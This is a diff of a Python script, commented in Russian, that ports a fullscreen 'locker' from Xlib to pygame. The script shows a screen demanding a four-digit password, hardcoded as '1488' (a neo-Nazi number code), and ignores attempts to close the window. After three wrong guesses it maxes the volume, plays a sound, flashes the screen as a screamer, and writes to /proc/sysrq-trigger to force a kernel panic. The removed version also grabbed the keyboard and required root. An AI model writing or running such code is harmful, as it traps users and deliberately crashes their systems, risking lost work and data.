@@ -1,148 +1,104 @@
 #!/usr/bin/env python3
 import os, sys, time, threading, subprocess
-from Xlib import X, XK
-from Xlib.display import Display
+import pygame
+from pygame.locals import *
 
 PASSWORD = "1488"
 MAX_ATTEMPTS = 3
 attempts_left = MAX_ATTEMPTS
 input_buffer = ""
 
-# Функции разрушения
+# ---------- громкий звук ----------
 def play_loud_sound():
     subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
     subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)
 
+# ---------- kernel panic ----------
 def trigger_kernel_panic():
     with open("/proc/sysrq-trigger", "w") as f:
         f.write("c")
 
-class Locker:
-    def __init__(self):
-        self.disp = Display()
-        self.screen = self.disp.screen()
-        self.width = self.screen.width_in_pixels
-        self.height = self.screen.height_in_pixels
-        self.root = self.screen.root
+# ---------- инициализация Pygame ----------
+pygame.init()
+info = pygame.display.Info()
+screen = pygame.display.set_mode((info.current_w, info.current_h),
+                                 pygame.FULLSCREEN | pygame.NOFRAME)
+pygame.display.set_caption("LOCKED")
+pygame.mouse.set_visible(False)
 
-        # Цвета
-        self.colormap = self.screen.default_colormap
-        self.black = self.screen.black_pixel
-        self.green = self.colormap.alloc_color(0, 65535, 0).pixel
-        self.red = self.colormap.alloc_color(65535, 0, 0).pixel
-        self.white = self.colormap.alloc_color(65535, 65535, 65535).pixel
+# шрифт (встроенный, всегда доступен)
+font = pygame.font.SysFont("monospace", 28, bold=True)
+font_small = pygame.font.SysFont("monospace", 22)
 
-        # Окно поверх всего, без рамок
-        self.win = self.root.create_window(
-            0, 0, self.width, self.height, 0,
-            self.screen.root_depth,
-            X.InputOutput,
-            X.CopyFromParent,
-            background_pixel=self.black,
-            event_mask=X.ExposureMask,
-            override_redirect=True
-        )
-        self.win.map()
-        self.disp.flush()
+# цвета
+BLACK = (0, 0, 0)
+GREEN = (0, 255, 0)
+RED   = (255, 0, 0)
+WHITE = (255, 255, 255)
 
-        # Графический контекст и шрифт
-        self.gc = self.win.create_gc(foreground=self.green, background=self.black)
-        self.font = self.disp.open_font("fixed")
+# ---------- отрисовка экрана ----------
+def draw_screen():
+    screen.fill(BLACK)
+    # заголовок
+    txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
+    screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
+    # попытки
+    txt2 = font_small.render(f"ATTEMPTS LEFT: {attempts_left}", True, GREEN)
+    screen.blit(txt2, (screen.get_width()//2 - txt2.get_width()//2, 100))
+    # звёздочки ввода
+    stars = "*" * len(input_buffer)
+    inp = font.render(f"> {stars}", True, GREEN)
+    screen.blit(inp, (screen.get_width()//2 - inp.get_width()//2, 150))
+    # цифровая клавиатура
+    keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
+    for i, row in enumerate(keys):
+        txt_key = font_small.render(row, True, GREEN)
+        screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
+    pygame.display.flip()
 
-        # Захват клавиатуры на корень – никакие шоткаты не просочатся
-        self.root.grab_keyboard(
-            True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime
-        )
-        self.disp.flush()
+# ---------- главный цикл ----------
+running = True
+draw_screen()
 
-        self.running = True
+while running:
+    for event in pygame.event.get():
+        if event.type == KEYDOWN:
+            if event.key == K_RETURN:
+                if input_buffer == PASSWORD:
+                    running = False
+                    pygame.quit()
+                    sys.exit(0)
+                else:
+                    input_buffer = ""
+                    attempts_left -= 1
+                    if attempts_left <= 0:
+                        draw_screen()
+                        # запускаем звук и мигание в фоне
+                        threading.Thread(target=play_loud_sound, daemon=True).start()
+                        # мигание (10 циклов)
+                        for i in range(10):
+                            color = RED if i % 2 == 0 else WHITE
+                            screen.fill(color)
+                            pygame.display.flip()
+                            time.sleep(0.1)
+                        screen.fill(BLACK)
+                        pygame.display.flip()
+                        # через 5 секунд kernel panic
+                        threading.Timer(5.0, trigger_kernel_panic).start()
+                        running = False
+                    else:
+                        draw_screen()
+            elif event.key == K_BACKSPACE:
+                input_buffer = input_buffer[:-1]
+                draw_screen()
+            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
+                if len(input_buffer) < 4:
+                    input_buffer += chr(event.key)
+                    draw_screen()
+            # все остальные клавиши игнорируются
+        if event.type == QUIT:
+            pass   # игнорируем попытки закрыть окно мышью
 
-    def draw_centered_text(self, text, y, color_pixel=None):
-        """Рисует строку зелёным (или указанным цветом) по центру экрана."""
-        if color_pixel is None:
-            color_pixel = self.green
-        self.gc.change(foreground=color_pixel)
-        # Закодируем в Latin-1, Xlib ожидает список bytes‑строк
-        text_bytes = text.encode("latin-1")
-        self.win.draw_text(self.font, self.gc,
-                           self.width//2 - len(text) * 4,  # примерный отступ
-                           y, [text_bytes])
-        self.disp.flush()
-
-    def redraw(self):
-        """Полная перерисовка экрана (чёрный фон + весь текст)."""
-        self.win.clear_area(0, 0, self.width, self.height)
-        self.draw_centered_text("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", 50)
-        self.draw_centered_text(f"ATTEMPTS LEFT: {attempts_left}", 100)
-        stars = "*" * len(input_buffer)
-        self.draw_centered_text(f"> {stars}", 150)
-        keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
-        for i, line in enumerate(keys):
-            self.draw_centered_text(line, 210 + i*40)
-
-    def flash(self):
-        """Мигание красным/белым 10 раз (скримерный эффект)."""
-        for i in range(10):
-            pixel = self.red if i % 2 == 0 else self.white
-            self.win.change_attributes(background_pixel=pixel)
-            self.disp.flush()
-            time.sleep(0.1)
-        self.win.change_attributes(background_pixel=self.black)
-        self.disp.flush()
-
-    def run(self):
-        self.redraw()
-        while self.running:
-            event = self.disp.next_event()
-            if event.type == X.KeyPress:
-                keysym = self.disp.keycode_to_keysym(event.detail, 0)
-                if keysym == XK.XK_Return:
-                    self.check_password()
-                elif keysym == XK.XK_BackSpace:
-                    global input_buffer
-                    input_buffer = input_buffer[:-1]
-                    self.redraw()
-                elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
-                                XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
-                    if len(input_buffer) < 4:
-                        input_buffer += chr(keysym)
-                        self.redraw()
-            elif event.type == X.Expose:
-                self.redraw()
-
-    def check_password(self):
-        global attempts_left, input_buffer, running
-        if input_buffer == PASSWORD:
-            self.cleanup()
-            sys.exit(0)
-        else:
-            input_buffer = ""
-            attempts_left -= 1
-            if attempts_left <= 0:
-                self.running = False
-                self.trigger_failure()
-            else:
-                self.redraw()
-
-    def trigger_failure(self):
-        # Звук в фоне
-        threading.Thread(target=play_loud_sound, daemon=True).start()
-        # Мигание
-        self.flash()
-        # Через 5 секунд после начала – kernel panic
-        threading.Timer(5.0, trigger_kernel_panic).start()
-        # Оставляем окно висеть до перезагрузки
-        while True:
-            time.sleep(1)
-
-    def cleanup(self):
-        self.root.ungrab_keyboard(X.CurrentTime)
-        self.win.destroy()
-        self.disp.close()
-
-if __name__ == "__main__":
-    if os.geteuid() != 0:
-        print("Run as root (sudo).")
-        sys.exit(1)
-    locker = Locker()
-    locker.run()
+# если вышли из цикла (только при провале), оставляем висеть до перезагрузки
+while True:
+    time.sleep(1)
